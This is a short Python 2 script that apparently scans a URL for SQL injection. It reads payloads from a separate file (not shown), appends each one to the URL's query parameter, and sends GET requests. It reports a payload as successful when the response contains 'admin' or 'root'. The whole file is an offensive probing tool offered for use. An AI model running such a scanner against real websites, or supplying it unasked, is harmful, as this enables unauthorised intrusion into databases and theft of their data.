#!/usr/bin/env python
import requests

url=raw_input("URL ")


sql_file = open("sqlpayload.txt", "r")
sql_payload = sql_file.readlines()
sql_file.close()
if "=" in url:
	value = str(url).find('=')
        for i in sql_payload:
            try:
                i = i.split("\n")[0]
                content = str(url[0:value + 1]) + str(i)
                result = requests.get(content)
                if "admin" in result.content or "root" in result.content:
                    print "[+]Sqli paylaod: ", str(i)
                    print "[+]Sqli URL: ", content
                else:
                    print "[-]Sqli paylaod: ", str(i)
                    print "[-]Sqli URL: ", content
                  
            except:
                pass
else:
	print "[-]Sqli Not Found"
	
               
